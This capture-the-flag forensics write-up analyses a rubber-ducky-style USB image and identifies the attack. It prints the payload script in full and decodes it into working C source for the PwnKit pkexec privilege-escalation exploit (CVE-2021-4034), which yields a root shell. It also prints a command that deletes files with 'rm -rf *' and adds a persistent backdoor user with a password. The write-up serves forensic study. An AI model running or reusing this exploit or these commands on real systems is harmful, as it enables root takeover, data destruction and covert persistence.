# PicoCTF (Forensics, 450)
## *Description:*
  The it team are pretty sure that the headmaster got hacked again when they found a stranged device attached to his PC. Here is a memory dump, identify the CVE used by the hacker, along with the username:password used for persistence. Flag format: shellmates{CVE-xxxx-yyyy:username:password}
- Attachment: [dump](./Attachments/dump)
## *Solution:*
1. First checks: 
	```Bash
    file dump 
	dump: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "mkfs.fat", root entries 512, Media descriptor 0xf8, sectors/FAT 254, sectors/track 63, heads 255, sectors 65536 (volumes > 32 MB), serial number 0x7cdb00d9, label: "PICODUCK   ", FAT (16 bit)
	```

    ```Bash
    mount dump ./mount-point 
    ```
    - Existant files: 
    `boot_out.txt  code.py  lib  payload.dd
    - `boot_out.txt` and `/lib/*` where related to Adafruit; `code.py` was the keylogger code. The rest of files where quite attractive.
2. Content of payload.dd: 
```
CTRL ALT T
STRING echo "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgpjaGFyKiBvX2NjMmVmYTI2ZmVkMDg5ZDQ5MWY2MjJiZGM2Mjk4YjZmPSJceDIzIiJpXDE1NmNceDZDIiJ1XDE0NGVceDIwIiI8XDE2M3RceDY0IiJpXDE1Ny5ceDY4IiI+XDAxMiNceDY5IiJuXDE0M2xceDc1IiJkXDE0NSBceDNDIiJzXDE2NGRceDZDIiJpXDE0Mi5ceDY4IiI+XDAxMiNceDY5IiJuXDE0M2xceDc1IiJkXDE0NSBceDNDIiJ1XDE1NmlceDczIiJ0XDE0NC5ceDY4IiI+XDAxMlx4MEFceDc2IiJvXDE1MWRceDIwIiJnXDE0M29ceDZFIiJ2XDA1MClceDIwIiJ7XDE3NVx4MEFceDc2IiJvXDE1MWRceDIwIiJnXDE0M29ceDZFIiJ2XDEzN2lceDZFIiJpXDE2NChceDI5IiIgXDE3M1x4MEFceDA5IiJzXDE0NXRceDc1IiJpXDE0NChceDMwIiIpXDA3MyBceDczIiJlXDE2NGdceDY5IiJkXDA1MDBceDI5IiI7XDAxMlx4MDlceDczIiJlXDE2NGVceDc1IiJpXDE0NChceDMwIiIpXDA3MyBceDczIiJlXDE2NGVceDY3IiJpXDE0NChceDMwIiIpXDA3M1x4MEFceDA5IiJzXDE3MXNceDc0IiJlXDE1NShceDIyIiJlXDE3MHBceDZGIiJyXDE2NCBceDUwIiJBXDEyNEhceDNEIiIvXDE2NXNceDcyIiIvXDE1NG9ceDYzIiJhXDE1NC9ceDczIiJiXDE1MW5ceDNBIiIvXDE2NXNceDcyIiIvXDE1NG9ceDYzIiJhXDE1NC9ceDYyIiJpXDE1NjpceDJGIiJ1XDE2M3JceDJGIiJzXDE0MmlceDZFIiI6XDA1N3VceDczIiJyXDA1N2JceDY5IiJuXDA3Mi9ceDczIiJiXDE1MW5ceDNBIiIvXDE0MmlceDZFIiI7XDA0MHJceDZEIiIgXDA1NXJceDY2IiIgXDA0N0dceDQzIiJPXDExNlZceDVGIiJQXDEwMVRceDQ4IiI9XDA1NlwnXHgyMCIiXCdcMTUwZVx4NjgiImVcMDQ3O1x4MjAiIi9cMTQyaVx4NkUiIi9cMTYzaFx4MjIiIilcMDczXHgwQVx4MDkiImVcMTcwaVx4NzQiIihcMDYwKVx4M0IiIlx4MEFcMTc1IjtpbnQgbWFpbihpbnQgb19jZDEzZjVkMTkwZmE0ZDhhYjQxOGJkNzVmN2RkY2RiOCxjaGFyICogb181OGNlOTAzYjM0YzU2ZmYzYzRmZWViOWQ1MTdlNDFhYltdKXtGSUxFKiBvX2UyNDQ0ZDRkMTViYzU2OGMzNDI1MzkwZTQ5ZGVmOTQ2O3N5c3RlbSgiXHg2RCIia1wxNDRpXHg3MiIiIFwwNTVwXHgyMCIiXCdcMTA3Q1x4NEYiIk5cMTI2X1x4NTAiIkFcMTI0SFx4M0QiIi5cMDQ3O1x4MjAiInRcMTU3dVx4NjMiImhcMDQwXCdceDQ3IiJDXDExN05ceDU2IiJfXDEyMEFceDU0IiJIXDA3NS5ceDJGIiJoXDE0NWhceDY1IiJcJ1wwNzMgXHg2MyIiaFwxNTVvXHg2NCIiIFwxNDErXHg3OCIiIFwwNDdHXHg0MyIiT1wxMTZWXHg1RiIiUFwxMDFUXHg0OCIiPVwwNTYvXHg2OCIiZVwxNTBlXHgyNyIiIik7c3lzdGVtKCJceDZEIiJrXDE0NGlceDcyIiIgXDA1NXBceDIwIiJoXDE0NWhceDY1IiI7XDA0MGVceDYzIiJoXDE1NyBceDI3IiJtXDE1N2RceDc1IiJsXDE0NSBceDU1IiJUXDEwNi1ceDM4IiIvXDA1NyBceDQ4IiJFXDExMEVceDJGIiIvXDA0MGhceDY1IiJoXDE0NSBceDMyIiJcJ1wwNDA+XHgyMCIiaFwxNDVoXHg2NSIiL1wxNDdjXHg2RiIiblwxNjYtXHg2RCIib1wxNDR1XHg2QyIiZVwxNjMiKTtvX2UyNDQ0ZDRkMTViYzU2OGMzNDI1MzkwZTQ5ZGVmOTQ2ID0gZm9wZW4oIlx4NjgiImVcMTUwZVx4MkYiImhcMTQ1aFx4NjUiIi5cMTQzIiwiXHg3NyIiIik7ZnByaW50ZihvX2UyNDQ0ZDRkMTViYzU2OGMzNDI1MzkwZTQ5ZGVmOTQ2LCJceDI1IiJzIixvX2NjMmVmYTI2ZmVkMDg5ZDQ5MWY2MjJiZGM2Mjk4YjZmKTtmY2xvc2Uob19lMjQ0NGQ0ZDE1YmM1NjhjMzQyNTM5MGU0OWRlZjk0Nik7c3lzdGVtKCJceDY3IiJjXDE0MyBceDY4IiJlXDE1MGVceDJGIiJoXDE0NWhceDY1IiIuXDE0MyBceDJEIiJvXDA0MGhceDY1IiJoXDE0NS9ceDY4IiJlXDE1MGVceDJFIiJzXDE1NyBceDJEIiJzXDE1MGFceDcyIiJlXDE0NCBceDJEIiJmXDEyMElceDQzIiIiKTtjaGFyICogb19iZTE5ZTk3M2Q4ZGQyYTY2MGRiNGY2NTNjNTdhN2UwMVtdPXsgImhlaGUiLCAiUEFUSD1HQ09OVl9QQVRIPS4iLCAiQ0hBUlNFVD1IRUhFIiwgIlNIRUxMPWhlaGUiLCBOVUxMIH07ZXhlY3ZlKCJceDJGIiJ1XDE2M3JceDJGIiJiXDE1MW5ceDJGIiJwXDE1M2VceDc4IiJlXDE0MyIsKGNoYXIqW10pe05VTEx9LG9fYmUxOWU5NzNkOGRkMmE2NjBkYjRmNjUzYzU3YTdlMDEpO307" | base64 -d > GYUJH.c && gcc -w GYUJH.c -o GYUJh && ./GYUJh
 
STRING eval $(echo "ZWNobyA3MjZkMjAyZDcyNjYyMDJhMjAyNjI2MjA3NTczNjU3MjYxNjQ2NDIwMmQ2ZDIwMmQ2NDIwMmY2ODZmNmQ2NTJmNzM3OTczNzQ2NTZkNjQ2NDIwMmQ3MzIwMmY2MjY5NmUyZjYyNjE3MzY4MjA3Mzc5NzM3NDY1NmQ2NDY0MjAyNjI2MjA2NTYzNjg2ZjIwMjc3Mzc5NzM3NDY1NmQ2NDY0M2E1OTU1NDk0ZjRlNDg0MjU5MjcyMDdjMjA2MzY4NzA2MTczNzM3NzY0IHwgeHhkIC1yIC1wIHwgYmFzaA==" | base64 -d)

```

3. Payloads decoding:
```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
char* o_cc2efa26fed089d491f622bdc6298b6f="\x23""i\156c\x6C""u\144e\x20""<\163t\x64""i\157.\x68"">\012#\x69""n\143l\x75""d\145 \x3C""s\164d\x6C""i\142.\x68"">\012#\x69""n\143l\x75""d\145 \x3C""u\156i\x73""t\144.\x68"">\012\x0A\x76""o\151d\x20""g\143o\x6E""v\050)\x20""{\175\x0A\x76""o\151d\x20""g\143o\x6E""v\137i\x6E""i\164(\x29"" \173\x0A\x09""s\145t\x75""i\144(\x30"")\073 \x73""e\164g\x69""d\0500\x29"";\012\x09\x73""e\164e\x75""i\144(\x30"")\073 \x73""e\164e\x67""i\144(\x30"")\073\x0A\x09""s\171s\x74""e\155(\x22""e\170p\x6F""r\164 \x50""A\124H\x3D""/\165s\x72""/\154o\x63""a\154/\x73""b\151n\x3A""/\165s\x72""/\154o\x63""a\154/\x62""i\156:\x2F""u\163r\x2F""s\142i\x6E"":\057u\x73""r\057b\x69""n\072/\x73""b\151n\x3A""/\142i\x6E"";\040r\x6D"" \055r\x66"" \047G\x43""O\116V\x5F""P\101T\x48""=\056\'\x20""\'\150e\x68""e\047;\x20""/\142i\x6E""/\163h\x22"")\073\x0A\x09""e\170i\x74""(\060)\x3B""\x0A\175";int main(int o_cd13f5d190fa4d8ab418bd75f7ddcdb8,char * o_58ce903b34c56ff3c4feeb9d517e41ab[]){FILE* o_e2444d4d15bc568c3425390e49def946;system("\x6D""k\144i\x72"" \055p\x20""\'\107C\x4F""N\126_\x50""A\124H\x3D"".\047;\x20""t\157u\x63""h\040\'\x47""C\117N\x56""_\120A\x54""H\075.\x2F""h\145h\x65""\'\073 \x63""h\155o\x64"" \141+\x78"" \047G\x43""O\116V\x5F""P\101T\x48""=\056/\x68""e\150e\x27""");system("\x6D""k\144i\x72"" \055p\x20""h\145h\x65"";\040e\x63""h\157 \x27""m\157d\x75""l\145 \x55""T\106-\x38""/\057 \x48""E\110E\x2F""/\040h\x65""h\145 \x32""\'\040>\x20""h\145h\x65""/\147c\x6F""n\166-\x6D""o\144u\x6C""e\163");o_e2444d4d15bc568c3425390e49def946 = fopen("\x68""e\150e\x2F""h\145h\x65"".\143","\x77""");fprintf(o_e2444d4d15bc568c3425390e49def946,"\x25""s",o_cc2efa26fed089d491f622bdc6298b6f);fclose(o_e2444d4d15bc568c3425390e49def946);system("\x67""c\143 \x68""e\150e\x2F""h\145h\x65"".\143 \x2D""o\040h\x65""h\145/\x68""e\150e\x2E""s\157 \x2D""s\150a\x72""e\144 \x2D""f\120I\x43""");char * o_be19e973d8dd2a660db4f653c57a7e01[]={ "hehe", "PATH=GCONV_PATH=.", "CHARSET=HEHE", "SHELL=hehe", NULL };execve("\x2F""u\163r\x2F""b\151n\x2F""p\153e\x78""e\143",(char*[]){NULL},o_be19e973d8dd2a660db4f653c57a7e01);};
```

```Bash
rm -rf * && useradd -m -d /home/systemdd -s /bin/bash systemdd && echo 'systemdd:YUIONHBY' | chpasswd
```

And with this we've got the username and the password.
I honestly made a mistake when I ignored the first payload "the C program". And I've wasted a good amount of time looking for all CVEs that can relate to the information I had at that time.
Until my failed submissions got wild XD. 
![Fails rate from CTFd](./Attachments/fails.png)

I tried to make the C program more readable: 
```C
#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

char* o_cc2efa26fed089d491f622bdc6298b6f= '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid gconv() {}\nvoid gconv_init() {\n\tsetuid(0); setgid(0);\n\tseteuid(0); setegid(0);\n\tsystem("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf \'GCONV_PATH=.\' \'hehe\'; /bin/sh");\n\texit(0);\n}'


int main(int o_cd13f5d190fa4d8ab418bd75f7ddcdb8,char * o_58ce903b34c56ff3c4feeb9d517e41ab[]){

FILE* o_e2444d4d15bc568c3425390e49def946;

system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./hehe'; chmod a+x 'GCONV_PATH=./hehe'");

system("mkdir -p hehe; echo 'module UTF-8// HEHE// hehe 2' > hehe/gconv-modules");

o_e2444d4d15bc568c3425390e49def946 = fopen('hehe/hehe.c', 'w');

fprintf(o_e2444d4d15bc568c3425390e49def946,"%s",o_cc2efa26fed089d491f622bdc6298b6f);

fclose(o_e2444d4d15bc568c3425390e49def946);

system("gcc hehe/hehe.c -o hehe/hehe.so -shared -fPIC");

char * o_be19e973d8dd2a660db4f653c57a7e01[]={ "hehe", "PATH=GCONV_PATH=.", "CHARSET=HEHE", "SHELL=hehe", NULL };

execve("/usr/bin/pkexec",(char*[]){NULL},o_be19e973d8dd2a660db4f653c57a7e01);};
```

4. I started my researches about `pkexec` exploits. There was a well know CVE related to: 
`PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034)`
[PoC:](https://github.com/PwnFunction/CVE-2021-4034)

## *Flag:*
shellmates{CVE-2021-4034:systemdd:YUIONHBY}